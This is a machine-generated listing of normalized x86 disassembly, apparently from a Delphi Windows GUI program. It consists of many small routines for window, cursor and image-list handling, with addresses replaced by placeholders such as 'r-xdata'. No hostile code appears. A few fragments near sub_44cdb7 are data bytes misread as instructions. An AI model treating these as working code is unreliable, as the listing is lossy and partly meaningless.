sub_443de8
movzx eax [ eax + 0x1dd ]
xor al 0x1
retn
sub_443df4
cmp dl [ eax + 0x1dd ]
je r-xdata
retn
mov [ eax + 0x1dd ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43d400
sub_443ea0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_443e44
retn
movsx edx dx
mov [ eax + 0x1d4 ] edx
retn
sub_443f7c
jmp sub_4046f8
sub_443f83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4441a2
jmp sub_4046f8
sub_4441a9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44426c
call sub_43d1d0
retn
sub_4447aa
jmp sub_4046f8
sub_444840
mov eax [ r-xdata ]
retn
sub_4449a6
jmp sub_4046f8
sub_444ab4
cmp dl [ eax + 0x195 ]
je r-xdata
retn
mov [ eax + 0x195 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43d400
sub_444e17
jmp sub_4046f8
sub_444f85
jmp sub_4046f8
sub_444fa8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_444ff0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax esi
call sub_445008
pop esi
retn
sub_44503c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0xc
sub_445048
xor eax eax
retn
sub_4450a0
call sub_43fabc
retn
sub_4450a8
mov eax [ eax + 0x1a0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4451ec
jmp sub_4046f8
sub_4451f3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4452c8
mov [ edx + 0xc ] 0xffffffff
retn
sub_445326
jmp sub_4046f8
sub_44532d
pop ecx
pop ecx
pop ebp
retn
sub_4453cd
jmp sub_4046f8
sub_4453d4
pop ebx
mov esp ebp
pop ebp
retn
sub_445440
mov edx [ eax ]
call [ edx + 0xb0 ]
retn
sub_4454d7
jmp sub_4046f8
sub_4454de
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4456c8
jmp sub_4046f8
sub_4456cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4457ec
mov al 0x1
retn
sub_445878
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x68 ] cx
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax ecx
xchg edx eax
call sub_456478
sub_4459dc
push ebx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4459f4
push ebx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_445ae8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_441b90
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_445b83
jmp sub_4046f8
sub_445b8a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445bad
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_424450
retn
sub_445ba6
jmp sub_4046f8
sub_445bad
pop ebx
pop ecx
pop ebp
retn
sub_445bb4
retn
sub_445c1c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_445fb5
jmp sub_4046f8
sub_4461a0
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_446391
jmp sub_4046f8
sub_446440
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_446458
inc [ eax + 0x6c ]
retn
sub_44645c
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_448004
sub_4465bc
call sub_446cac
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44709a
jmp sub_4046f8
sub_4470a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4470c6
lea eax [ ebp - 0x44 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_4470bf
jmp sub_4046f8
sub_4470c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447486
jmp sub_4046f8
sub_44748d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4474aa
mov eax [ ebp - 0x4 ]
call sub_424450
retn
sub_4474a3
jmp sub_4046f8
sub_4474aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4474c7
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_4474c0
jmp sub_4046f8
sub_4474c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4479ad
jmp sub_4046f8
sub_4479b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b53
jmp sub_4046f8
sub_447b5a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447c60
jmp sub_4046f8
sub_447c67
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447d90
jmp sub_4046f8
sub_447e17
jmp sub_4046f8
sub_447e1e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447edc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4464c8
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44802c
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_445ff8
sub_44803c
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_4487d8
cmp dl 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456ea0
call sub_455c54
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456ea0
call sub_455c88
retn
sub_448b9d
jmp sub_4046f8
sub_448ba4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448c9c
call GetCapture
retn
sub_448ca4
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40f3d0
pop ebx
retn
sub_448cb4
cmp [ rw-data ] 0x0
setne al
retn
sub_448ce4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_448f6a
jmp sub_4046f8
sub_449160
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_449374
jmp sub_4046f8
sub_44937b
pop ebx
mov esp ebp
pop ebp
retn
sub_449454
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_449468
mov [ edx + 0x8 ] 0x3
mov [ edx + 0x10 ] 0x3
mov [ edx + 0xc ] 0x3
mov [ edx + 0x14 ] 0x3
retn
sub_4495bb
jmp sub_4046f8
sub_449790
retn
sub_4497f3
jmp sub_4046f8
sub_4497fa
pop ebp
retn
sub_449970
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_449af5
jmp sub_4046f8
sub_449afc
pop ebx
pop ecx
pop ebp
retn
sub_449b00
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_449b08
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_449cd8
sub_449bb5
jmp sub_4046f8
sub_449bbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403f64
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_449d6a
jmp sub_4046f8
sub_449d71
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449e0a
jmp sub_4046f8
sub_449e11
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449e2e
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_449e27
jmp sub_4046f8
sub_449e2e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_404160
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449ee7
jmp sub_4046f8
sub_449eee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449ef4
or edx 0xffffffff
call sub_449e68
retn
sub_44a307
jmp sub_4046f8
sub_44a30e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a32b
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_44a324
jmp sub_4046f8
sub_44a32b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a348
mov eax [ ebp - 0x4 ]
call sub_44ae48
retn
sub_44a341
jmp sub_4046f8
sub_44a348
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a554
jmp sub_4046f8
sub_44a55b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a560
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_404160
sub_44a578
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_415348
pop ebx
retn
sub_44a61c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_416668
sub_44a733
jmp sub_4046f8
sub_44a73a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
sub_44a750
jmp sub_4046f8
sub_44aa62
jmp sub_4046f8
sub_44aa69
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa86
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
sub_44aa7f
jmp sub_4046f8
sub_44aa86
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aaa3
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
sub_44aa9c
jmp sub_4046f8
sub_44aaa3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ab0c
jmp sub_4046f8
sub_44ac26
jmp sub_4046f8
sub_44ac43
jmp sub_4046f8
sub_44adfa
jmp sub_4046f8
sub_44ae01
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ae44
inc [ eax + 0x5c ]
retn
sub_44ae48
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_404160
sub_44ae9c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44b3e0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_416824
retn
sub_44b3f8
mov al 0x1
retn
sub_44b3fc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41dea4
retn
mov eax edx
retn
sub_44b40c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41de74
retn
mov al 0x1
retn
sub_44b6fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4167c8
pop esi
pop ebx
retn
sub_44b710
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44b74c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44b9cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44b9e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44b9f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba08
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba1c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba44
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba58
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba6c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba80
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
pop ebx
retn
sub_44ba94
retn
sub_44ba98
retn
sub_44ba9c
retn
sub_44baa0
retn
sub_44baa4
retn
sub_44baa8
retn
sub_44baac
retn
sub_44bab0
retn
sub_44bab4
retn
sub_44bab8
retn
sub_44babc
retn
sub_44bac0
retn
sub_44bd70
jmp sub_4046f8
sub_44c114
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x90 ] eax
sub_44c13c
push esi
mov si 0xffef
call sub_404160
pop esi
retn
sub_44c1e4
pop ebp
retn
sub_44cdb7
[ esi - 0x53005201 ]
sub_44cdbd
[ ebx - 0x56005501 ]
sub_44cdc4
std
[ eax - 0x59005801 ]
sub_44cdce
stc
jmp esp
sub_44d6af
inc esp
add [ eax ] dh
add eax [ eax ]
jmp [ ecx + 0x10045 ]
sub_44d791
pushad
retn 0x43
sub_44e274
mov eax [ rw-data ]
retn
sub_44e27c
mov [ rw-data ] eax
retn
sub_44e3cb
jmp sub_404444
sub_44e409
jmp sub_4046f8
sub_44e410
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e722
jmp sub_4046f8
sub_44e729
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e778
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_44e734
retn
xor edx edx
sub_44e7f9
jmp sub_4046f8
sub_44e800
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e894
movzx eax [ eax + 0x1f ]
xor al 0x1
retn
sub_44efe8
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44f69c
sub_44f004
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44efe8
sub_44f124
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44f69c
sub_44f13c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44f69c
sub_44f154
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44f69c
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44f180
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x258 ]
xor al 0x1
retn
sub_44f190
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44f69c
retn
sub_44f474
push ebx
mov ebx edx
mov edx ebx
call sub_440104
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44f4e4
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1db ] 0x0
je r-xdata
sub_44f60c
jmp sub_4046f8
sub_44f613
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f61c
push ebx
mov ebx eax
cmp [ ebx + 0x25c ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x250 ]
call sub_44ea00
mov eax [ ebx + 0x254 ]
call sub_44ea00
sub_44f67c
push esi
mov esi eax
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44f68c
push esi
mov esi eax
mov eax [ esi + 0x254 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44f787
jmp sub_4046f8
sub_44f794
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44f7ac
sub_44f9c8
retn
sub_44fa38
jmp sub_4046f8
sub_44fa87
jmp sub_4046f8
sub_44fabc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_441d84
retn
mov ecx [ eax + 0x250 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
call sub_44ec8c
retn
sub_44fae0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_441da4
retn
mov ecx [ eax + 0x254 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x254 ]
call sub_44ec8c
retn
sub_44fbe5
jmp sub_4046f8
sub_44fbec
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_44e8ec
mov eax [ ebp - 0x4 ]
call sub_44f69c
sub_44fd20
jmp sub_4046f8
sub_44fd58
jmp sub_4046f8
sub_44fd5f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd7f
lea eax [ ebp - 0x114 ]
call sub_404e44
retn
sub_44fd78
jmp sub_4046f8
sub_44fd7f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4500a9
jmp sub_4046f8
sub_4500b0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4042d8
sub_450105
jmp sub_404444
sub_450181
jmp sub_404444
sub_450186
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4505a6
jmp sub_4046f8
sub_4505ad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x2b8 ] eax
pop esi
pop ebx
retn
sub_4506a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450714
mov edx eax
mov eax esi
call sub_41cff0
pop esi
pop ebx
retn
sub_4506bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4520f0
mov edx eax
mov eax esi
call sub_41cff0
pop esi
pop ebx
retn
sub_450714
push ebx
mov ebx eax
mov eax ebx
call sub_451c4c
mov edx r-xdata
call sub_4243d4
pop ebx
retn
sub_450820
push ebx
mov ebx eax
mov eax ebx
call sub_450830
xor al 0x1
pop ebx
retn
sub_450830
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x250 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x254 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45088c
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_4508ac
push ebx
cmp [ eax + 0x2fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
sub_4508cc
push ebx
cmp [ eax + 0x312 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_450a0c
mov edx [ eax + 0x1b4 ]
test edx edx
je r-xdata
xor eax eax
retn
push 0x4
push edx
call GetWindow
retn
sub_450beb
jmp sub_4046f8
sub_450bf2
pop ecx
pop ebp
retn
sub_450bf8
xor eax eax
retn
sub_450cac
jmp sub_4046f8
sub_450ff4
jmp sub_4046f8
sub_450ffb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_451011
jmp sub_4046f8
sub_4510fb
jmp sub_4046f8
sub_451102
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45111f
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_451118
jmp sub_4046f8
sub_45113f
jmp sub_4046f8
sub_45142a
jmp sub_4046f8
sub_4515c0
jmp sub_4046f8
sub_451c4c
mov eax [ eax + 0x280 ]
retn
sub_451c54
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_451c60
movzx eax [ eax + 0x5e ]
xor al 0x1
retn
sub_451df8
jmp sub_4046f8
sub_4520e0
jmp sub_4046f8
sub_4520e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4520f0
mov eax [ eax + 0x2a4 ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_452188
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4408ec
sub_452258
cmp [ eax + 0x2a4 ] 0x0
setne al
retn
sub_452294
push ebx
mov ebx eax
mov eax ebx
call sub_4430ec
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423ec8
sub_452318
push ebx
mov ebx eax
mov eax ebx
call sub_443114
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_424478
sub_452338
push ebx
mov ebx eax
mov eax ebx
call sub_451e04
mov edx [ ebx + 0x290 ]
mov eax ebx
call sub_451ecc
pop ebx
retn
sub_452da5
jmp sub_4046f8
sub_452dac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452eb0
jmp sub_4046f8
sub_453054
jmp sub_4046f8
sub_45305b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45334d
jmp sub_4046f8
sub_453354
mov eax [ rw-data ]
call sub_455ff8
mov [ ebp - 0x5 ] 0x1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453372
add [ eax ] al
retn
sub_4535f8
push ebx
cmp [ eax + 0x302 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
sub_453618
mov eax [ eax + 0x288 ]
call sub_429f38
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4580a0
sub_4536bf
jmp sub_4046f8
sub_4536c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4536e9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_424450
retn
sub_4536e2
jmp sub_4046f8
sub_4536e9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45381d
inc [ ebx + 0x298bb ]
add [ eax ] al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x298 ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_4538d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453618
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_453a18
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_442e5c
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_453c5c
mov ecx [ eax + 0x290 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_434924
sub_453d47
jmp sub_4046f8
sub_453d4e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453d54
cmp [ eax + 0x277 ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_4533f0
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_453dac
call sub_454bfc
retn
sub_453db4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4541fe
jmp sub_4046f8
sub_454205
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454580
jmp sub_404444
sub_454987
jmp sub_404444
sub_454ab6
jmp sub_4046f8
sub_454abd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ada
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_454ad3
jmp sub_4046f8
sub_454ada
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454ae4
push ebx
mov ebx eax
mov eax [ ebx + 0x288 ]
call sub_429f38
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4507c4
sub_454b04
call sub_403f64
retn
sub_454b5c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_454bc2
jmp sub_4046f8
sub_454d71
jmp sub_404444
sub_454d9c
xor edx edx
call sub_450b48
retn
sub_454da4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_450b48
mov eax ebx
call sub_43c3a8
pop ebx
retn
sub_454e3b
jmp sub_4046f8
sub_454e42
pop ebx
pop ecx
pop ebp
retn
sub_454e78
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_443be8
push eax
call PostMessageA
pop ebx
retn
sub_4550a6
jmp sub_4046f8
sub_455147
jmp sub_4046f8
sub_455151
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455170
mov eax [ rw-data ]
call sub_4575e0
retn
sub_455169
jmp sub_4046f8
sub_455170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45518d
lea eax [ ebp - 0x20 ]
call sub_404e44
retn
sub_455186
jmp sub_4046f8
sub_45518d
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455270
cmp [ eax + 0x30 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_456b0c
retn
retn
call sub_43b3a0
sub_455618
mov edx eax
mov eax [ rw-data ]
call sub_4589e0
mov al 0x1
retn
sub_455700
cmp dl [ eax + 0x328 ]
je r-xdata
retn
mov [ eax + 0x328 ] dl
call sub_455628
sub_455714
cmp dl [ eax + 0x329 ]
je r-xdata
retn
mov [ eax + 0x329 ] dl
call sub_455628
sub_455728
cmp edx [ eax + 0x354 ]
je r-xdata
retn
mov [ eax + 0x354 ] edx
call sub_455628
sub_45573c
cmp dl [ eax + 0x350 ]
je r-xdata
retn
mov [ eax + 0x350 ] dl
call sub_455628
sub_455750
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x328 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x350 ] 0x0
je r-xdata
sub_455940
jmp sub_4046f8
sub_455947
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455950
push ebx
mov ebx eax
mov eax ebx
call sub_442410
mov eax ebx
call sub_44259c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_454e78
sub_455bd5
jmp sub_4046f8
sub_455bdc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455be4
push ebx
mov ebx edx
mov edx ebx
call sub_4428b8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43b4bc
pop ebx
retn
sub_455c3c
push ebx
